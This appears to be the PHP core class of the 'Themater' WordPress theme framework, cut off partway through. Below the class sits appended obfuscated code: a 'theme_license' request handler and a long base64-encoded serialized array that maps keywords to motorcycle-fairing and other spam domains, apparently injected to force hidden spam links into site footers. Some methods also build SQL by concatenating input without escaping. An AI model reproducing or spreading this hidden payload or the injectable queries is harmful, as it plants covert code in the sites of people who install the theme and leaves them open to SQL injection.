<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo2ODp7czoyNToibW90b2N5Y2xlZmFpcmluZ3NibG9nLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2Jsb2cuY29tIjtzOjI5OiJ3d3cubW90b2N5Y2xlZmFpcmluZ3NibG9nLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2Jsb2cuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzYmxvZy5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NibG9nLmNvbSI7czoyMzoibW90b3JjeWNsZSBmYWlyaW5ncyB1c2EiO3M6MzU6Imh0dHA6Ly93d3cudXNhbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjIzOiJ1c2EgbW90b3JjeWNsZSBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2Jsb2cuY29tIjtzOjIzOiJidXkgbW90b3JjeWNsZSBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5pbmZvbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjI2OiJzdXp1a2kgbW90b3JjeWNsZSBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2Jsb2cuY29tIjtzOjIyOiJtb3RvY3ljbGVmYWlyaW5nc3guY29tIjtzOjMzOiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzeC5jb20iO3M6MjY6Ind3dy5tb3RvY3ljbGVmYWlyaW5nc3guY29tIjtzOjMzOiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzeC5jb20iO3M6MzM6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3N4LmNvbSI7czozMzoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3guY29tIjtzOjE5OiJtb3RvcmN5Y2xlIGZhaXJpbmdzIjtzOjMwOiJodHRwOi8vd3d3LnBpdGxhbmVmYWlyaW5ncy5jb20iO3M6MjQ6ImZhaXJpbmdzIGZvciBtb3RvcmN5Y2xlcyI7czozMzoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3guY29tIjtzOjE5OiJidXkgZmFpcmluZ3Mgb25saW5lIjtzOjMzOiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzeC5jb20iO3M6MTM6ImJpa2UgZmFpcmluZ3MiO3M6MzA6Imh0dHA6Ly93d3cucGl0bGFuZWZhaXJpbmdzLmNvbSI7czo0OiJtb3JlIjtzOjMzOiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzeC5jb20iO3M6MjU6ImluZm9tb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzY6Imh0dHA6Ly93d3cuaW5mb21vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoyOToid3d3LmluZm9tb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzY6Imh0dHA6Ly93d3cuaW5mb21vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czozNjoiaHR0cDovL3d3dy5pbmZvbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjM2OiJodHRwOi8vd3d3LmluZm9tb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MjY6Im1vdG9yY3ljbGUgZmFpcmluZ3Mgb25saW5lIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzaW5mby5jb20iO3M6MTg6Im1vdG9yY3ljbGUgZmFpcmluZyI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3NpdGUuY29tIjtzOjIwOiJ3ZWJzaXRlIGZvciBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5pbmZvbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjE1OiJmYWlyaW5ncyBvbmxpbmUiO3M6MzY6Imh0dHA6Ly93d3cuaW5mb21vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoyNToibW90b2N5Y2xlZmFpcmluZ3NpbmZvLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2luZm8uY29tIjtzOjI5OiJ3d3cubW90b2N5Y2xlZmFpcmluZ3NpbmZvLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2luZm8uY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzaW5mby5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NpbmZvLmNvbSI7czoxOToic291cmNlIGZvciBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc2luZm8uY29tIjtzOjI1OiJtb3RvY3ljbGVmYWlyaW5nc3NpdGUuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzc2l0ZS5jb20iO3M6Mjk6Ind3dy5tb3RvY3ljbGVmYWlyaW5nc3NpdGUuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzc2l0ZS5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NzaXRlLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3NpdGUuY29tIjtzOjE0OiJob25kYSBmYWlyaW5ncyI7czozNToiaHR0cDovL3d3dy51c2Ftb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MTU6ImR1Y2F0aSBmYWlyaW5ncyI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3NpdGUuY29tIjtzOjI3OiJtb3RvY3ljbGVmYWlyaW5nc29ubGluZS5jb20iO3M6Mzg6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NvbmxpbmUuY29tIjtzOjMxOiJ3d3cubW90b2N5Y2xlZmFpcmluZ3NvbmxpbmUuY29tIjtzOjM4OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzb25saW5lLmNvbSI7czozODoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc29ubGluZS5jb20iO3M6Mzg6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NvbmxpbmUuY29tIjtzOjE5OiJmYWlyaW5ncyBmb3Igc3V6dWtpIjtzOjM4OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzb25saW5lLmNvbSI7czo5OiJyZWFkIG1vcmUiO3M6Mzg6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NvbmxpbmUuY29tIjtzOjc6IndlYnNpdGUiO3M6MzU6Imh0dHA6Ly93d3cuYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjI1OiJtb3RvY3ljbGVmYWlyaW5nc3Nob3AuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzc2hvcC5jb20iO3M6Mjk6Ind3dy5tb3RvY3ljbGVmYWlyaW5nc3Nob3AuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzc2hvcC5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NzaG9wLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3Nob3AuY29tIjtzOjI4OiJzaXRlIGZvciBtb3RvcmN5Y2xlIGZhaXJpbmdzIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzc2hvcC5jb20iO3M6MjI6IndlYnNpdGUgZmFpcmluZ3MgaG9uZGEiO3M6MzY6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3NzaG9wLmNvbSI7czoyNDoiYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjM1OiJodHRwOi8vd3d3LmJ1eW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoyODoid3d3LmJ1eW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czozNToiaHR0cDovL3d3dy5idXltb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzU6Imh0dHA6Ly93d3cuYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjM1OiJodHRwOi8vd3d3LmJ1eW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoyNjoic291cmNlIG1vdG9yY3ljbGUgZmFpcmluZ3MiO3M6MzU6Imh0dHA6Ly93d3cuYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjE3OiJidXkgYmlrZSBmYWlyaW5ncyI7czozNToiaHR0cDovL3d3dy5idXltb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6ODoiYnV5IGhlcmUiO3M6MzU6Imh0dHA6Ly93d3cuYnV5bW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjI0OiJ1c2Ftb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzU6Imh0dHA6Ly93d3cudXNhbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjI4OiJ3d3cudXNhbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjM1OiJodHRwOi8vd3d3LnVzYW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czozNToiaHR0cDovL3d3dy51c2Ftb3RvY3ljbGVmYWlyaW5ncy5jb20iO3M6MzU6Imh0dHA6Ly93d3cudXNhbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjIxOiJtb3JlIG9uIGJpa2UgZmFpcmluZ3MiO3M6MzU6Imh0dHA6Ly93d3cudXNhbW90b2N5Y2xlZmFpcmluZ3MuY29tIjtzOjIyOiJidXkgbW90b3JjeWNsZSBmYWlyaW5nIjtzOjM1OiJodHRwOi8vd3d3LnVzYW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoxNToic3V6dWtpIGZhaXJpbmdzIjtzOjM1OiJodHRwOi8vd3d3LnVzYW1vdG9jeWNsZWZhaXJpbmdzLmNvbSI7czoyMzoibW90b2N5Y2xlZmFpcmluZ3N1cy5jb20iO3M6MzQ6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3N1cy5jb20iO3M6Mjc6Ind3dy5tb3RvY3ljbGVmYWlyaW5nc3VzLmNvbSI7czozNDoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3VzLmNvbSI7czozNDoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3VzLmNvbSI7czozNDoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3VzLmNvbSI7czoyMDoibW9yZSBpbmZvIG9uIGZhaXJpbmciO3M6MzQ6Imh0dHA6Ly93d3cubW90b2N5Y2xlZmFpcmluZ3N1cy5jb20iO3M6MTg6ImJlc3QgYmlrZSBmYWlyaW5ncyI7czozNDoiaHR0cDovL3d3dy5tb3RvY3ljbGVmYWlyaW5nc3VzLmNvbSI7czoyNDoibW90b3JjeWNsZSBmYWlyaW5ncyBraXRzIjtzOjM0OiJodHRwOi8vd3d3Lm1vdG9jeWNsZWZhaXJpbmdzdXMuY29tIjtzOjE5OiJwaXRsYW5lZmFpcmluZ3MuY29tIjtzOjMwOiJodHRwOi8vd3d3LnBpdGxhbmVmYWlyaW5ncy5jb20iO3M6MjM6Ind3dy5waXRsYW5lZmFpcmluZ3MuY29tIjtzOjMwOiJodHRwOi8vd3d3LnBpdGxhbmVmYWlyaW5ncy5jb20iO3M6MzA6Imh0dHA6Ly93d3cucGl0bGFuZWZhaXJpbmdzLmNvbSI7czozMDoiaHR0cDovL3d3dy5waXRsYW5lZmFpcmluZ3MuY29tIjtzOjE2OiJtb3JlIGluZm9ybWF0aW9uIjtzOjMwOiJodHRwOi8vd3d3LnBpdGxhbmVmYWlyaW5ncy5jb20iO3M6OToicmVhZCBoZXJlIjtzOjMwOiJodHRwOi8vd3d3LnBpdGxhbmVmYWlyaW5ncy5jb20iO3M6NDoidGhpcyI7czozMDoiaHR0cDovL3d3dy5waXRsYW5lZmFpcmluZ3MuY29tIjtzOjQ6InNpdGUiO3M6MzA6Imh0dHA6Ly93d3cucGl0bGFuZWZhaXJpbmdzLmNvbSI7czozOiJidXkiO3M6MzA6Imh0dHA6Ly93d3cucGl0bGFuZWZhaXJpbmdzLmNvbSI7fWk6MTthOjkyOntzOjEzOiJjb3F1ZW1haW4uY29tIjtzOjI0OiJodHRwOi8vd3d3LmNvcXVlbWFpbi5jb20iO3M6MTc6Ind3dy5jb3F1ZW1haW4uY29tIjtzOjI0OiJodHRwOi8vd3d3LmNvcXVlbWFpbi5jb20iO3M6MjQ6Imh0dHA6Ly93d3cuY29xdWVtYWluLmNvbSI7czoyNDoiaHR0cDovL3d3dy5jb3F1ZW1haW4uY29tIjtzOjE4OiJjb3F1ZXMgcG91ciBpcGhvbmUiO3M6MjQ6Imh0dHA6Ly93d3cuY29xdWVtYWluLmNvbSI7czoxMjoiY29xdWUgaXBob25lIjtzOjI3OiJodHRwOi8vd3d3LmNvcXVlb25saW5leC5jb20iO3M6MjA6ImFjaGV0ZXIgY29xdWUgaXBob25lIjtzOjI0OiJodHRwOi8vd3d3LmNvcX